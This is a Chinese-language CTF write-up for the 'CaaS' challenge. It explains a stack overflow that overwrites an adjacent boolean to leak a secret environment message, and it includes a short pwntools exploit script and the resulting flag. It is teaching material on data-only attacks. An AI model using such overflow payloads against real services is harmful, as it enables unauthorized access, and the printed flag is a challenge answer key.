# CaaS

## 题目简述

服务把用户输入读入固定大小的栈缓冲区，旁边保存着布尔变量 `chief_cow`。程序本来会通过 `setenv` 设置一条普通消息，但当该变量被改成非零值时，程序会拒绝覆盖环境中预先保存的秘密消息并将其打印出来。

## 解题过程

检查反编译结果可见，输入函数没有按目标缓冲区大小限制长度。缓冲区到 `chief_cow` 之间相隔 75 字节，因此不需要控制返回地址，只需让溢出数据覆盖这个邻接变量：

```python
from pwn import *

io = remote("host", 1234)
io.sendline(b"a" * 75)
io.interactive()
```

第 75 个字节之后的非零内容使 `chief_cow` 成立。程序随后保留原有环境变量，而不是用普通消息覆盖它，最终输出：

```text
UMDCTF-{P5Th_Ov3rF10w}
```

## 方法总结

栈溢出的目标不一定是返回地址。本题只需改变相邻状态变量，属于 data-only 攻击；分析时应同时查看缓冲区周围的局部变量及后续控制流，而不是一看到溢出就直接构造 ROP。
